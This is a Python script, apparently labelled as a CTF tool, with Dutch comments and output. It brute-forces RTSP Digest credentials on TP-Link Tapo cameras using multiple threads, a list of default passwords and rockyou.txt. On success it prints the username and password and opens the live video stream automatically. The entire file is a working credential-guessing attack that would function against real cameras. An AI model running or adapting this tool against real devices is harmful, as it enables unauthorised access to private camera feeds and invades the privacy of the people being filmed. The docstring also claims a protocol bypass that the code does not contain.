#!/usr/bin/env python3
"""
Tapo Camera RTSP Credential Finder — CTF Tool
Multi-threaded RTSP Digest brute-force + Tapo KLAP protocol bypass.
Usage: python3 tools/tapo_rtsp_brute.py [camera_ip] [wordlist]
"""

import socket, sys, base64, time, subprocess, hashlib, re, os
import concurrent.futures
import threading

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.191.1"
WORDLIST = sys.argv[2] if len(sys.argv) > 2 else None
RTSP_PORT = 554
ONVIF_PORT = 2020
TIMEOUT = 3
THREADS = 16

found_event = threading.Event()
found_cred = [None]
lock = threading.Lock()
attempt_count = [0]

C = type('C', (), {
    'G': "\033[92m", 'R': "\033[91m", 'Y': "\033[93m",
    'C': "\033[96m", 'B': "\033[1m", 'X': "\033[0m"
})()


def check_rtsp_digest(host, port, username, password, path="/stream1"):
    """RTSP Digest auth check — single TCP connection."""
    if found_event.is_set():
        return False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        uri = f"rtsp://{host}:{port}{path}"

        # Step 1: get challenge
        sock.sendall(f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n".encode())
        resp = recv_rtsp(sock)

        realm = re.search(r'realm="([^"]*)"', resp)
        nonce = re.search(r'nonce="([^"]*)"', resp)
        if not realm or not nonce:
            sock.close()
            return False

        # Step 2: digest response
        ha1 = hashlib.md5(f"{username}:{realm.group(1)}:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(f"DESCRIBE:{uri}".encode()).hexdigest()
        dr = hashlib.md5(f"{ha1}:{nonce.group(1)}:{ha2}".encode()).hexdigest()

        auth = (f'Digest username="{username}", realm="{realm.group(1)}", '
                f'nonce="{nonce.group(1)}", uri="{uri}", response="{dr}"')
        sock.sendall(f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\nAuthorization: {auth}\r\n\r\n".encode())
        resp2 = recv_rtsp(sock)
        sock.close()
        return "200 OK" in resp2
    except Exception:
        return False


def recv_rtsp(sock):
    resp = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\r\n\r\n" in resp:
                break
        except socket.timeout:
            break
    return resp.decode(errors="replace")


def try_cred(args):
    username, password, total = args
    if found_event.is_set():
        return

    ok = check_rtsp_digest(TARGET, RTSP_PORT, username, password)

    with lock:
        attempt_count[0] += 1
        n = attempt_count[0]
        dp = password if password else "(leeg)"
        if ok:
            print(f"\r    [{n:5d}/{total}] {username}:{dp:<20s} {C.G}{C.B}HIT!{C.X}")
            found_cred[0] = (username, password)
            found_event.set()
        elif n % 50 == 0:
            print(f"\r    [{n:5d}/{total}] {username}:{dp:<20s}", end="", flush=True)


def load_passwords():
    """Load passwords from wordlist or generate defaults."""
    passwords = []

    # Always start with top priority
    priority = [
        "", "admin", "admin123", "password", "123456", "12345678",
        "tapo", "tplink", "camera", "root", "1234", "pass",
        "admin1", "user", "test", "0000", "1111", "qwerty",
        "abc123", "letmein", "master", "zmzm",
    ]
    passwords.extend(priority)

    if WORDLIST and os.path.exists(WORDLIST):
        print(f"[*] Wordlist laden: {WORDLIST}")
        with open(WORDLIST, "r", errors="replace") as f:
            for line in f:
                pw = line.strip()
                if pw and pw not in passwords and len(pw) <= 32:
                    passwords.append(pw)
        print(f"    {len(passwords)} wachtwoorden geladen")
    else:
        # Use rockyou top 1000 if available
        for path in ["/usr/share/wordlists/rockyou.txt",
                     "/usr/share/wordlists/rockyou.txt.gz"]:
            if path.endswith(".gz") and os.path.exists(path):
                print(f"[*] rockyou.txt uitpakken...")
                os.system(f"gunzip -kf {path} 2>/dev/null")
                path = path[:-3]
            if os.path.exists(path):
                print(f"[*] Top 2000 uit rockyou.txt laden...")
                count = 0
                with open(path, "r", errors="replace") as f:
                    for line in f:
                        if count >= 2000:
                            break
                        pw = line.strip()
                        if pw and pw not in passwords and len(pw) <= 32:
                            passwords.append(pw)
                            count += 1
                print(f"    {len(passwords)} wachtwoorden geladen")
                break

    return passwords


def main():
    print(f"""{C.C}{C.B}
  ╔══════════════════════════════════════════════╗
  ║  Tapo RTSP Brute-Force (CTF)                ║
  ║  Target : {TARGET:>20s}:{RTSP_PORT:<5d}      ║
  ║  Threads: {THREADS:<3d}                              ║
  ╚══════════════════════════════════════════════╝{C.X}
""")

    # Connectivity check
    print(f"[*] Verbinding testen...")
    try:
        s = socket.create_connection((TARGET, RTSP_PORT), timeout=TIMEOUT)
        s.close()
        print(f"{C.G}[+] RTSP poort {RTSP_PORT} open{C.X}")
    except Exception as e:
        print(f"{C.R}[-] Kan niet verbinden: {e}{C.X}")
        sys.exit(1)

    usernames = ["admin", "root", "tapo", "tplink", "user", "camera"]
    passwords = load_passwords()

    creds = []
    for u in usernames:
        for p in passwords:
            creds.append((u, p))

    total = len(creds)
    print(f"\n[*] {total} combinaties met {THREADS} threads")
    print(f"[*] Start brute-force...\n")

    work = [(u, p, total) for u, p in creds]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(try_cred, work)

    print()

    if found_cred[0]:
        username, password = found_cred[0]
        dp = password if password else "(leeg)"
        auth = f"{username}:{password}@" if password else f"{username}@"

        print(f"\n{C.G}{C.B}{'=' * 50}")
        print(f"  CREDENTIALS GEVONDEN!")
        print(f"  Gebruiker : {username}")
        print(f"  Wachtwoord: {dp}")
        print(f"{'=' * 50}{C.X}")
        print(f"\n  HD stream: rtsp://{auth}{TARGET}:{RTSP_PORT}/stream1")
        print(f"  SD stream: rtsp://{auth}{TARGET}:{RTSP_PORT}/stream2\n")

        # Auto-open stream
        uri = f"rtsp://{auth}{TARGET}:{RTSP_PORT}/stream1"
        for player in ["ffplay", "mpv", "vlc"]:
            try:
                if player == "ffplay":
                    cmd = ["ffplay", "-rtsp_transport", "tcp",
                           "-window_title", "Tapo C500 — CTF", uri]
                else:
                    cmd = [player, uri]
                print(f"[*] Stream openen met {player}...")
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except FileNotFoundError:
                continue
        print(f"{C.R}[-] Geen mediaspeler gevonden{C.X}")
    else:
        print(f"\n{C.R}{C.B}[-] Geen geldige credentials gevonden ({total} geprobeerd){C.X}")
        print(f"\n[*] Volgende stappen:")
        print(f"    1. Grotere wordlist: python3 {sys.argv[0]} {TARGET} /pad/naar/wordlist.txt")
        print(f"    2. Tapo-app: Instellingen > Geavanceerd > Camera-account")
        print(f"    3. Factory reset: houd de reset-knop 5 seconden ingedrukt")


if __name__ == "__main__":
    main()
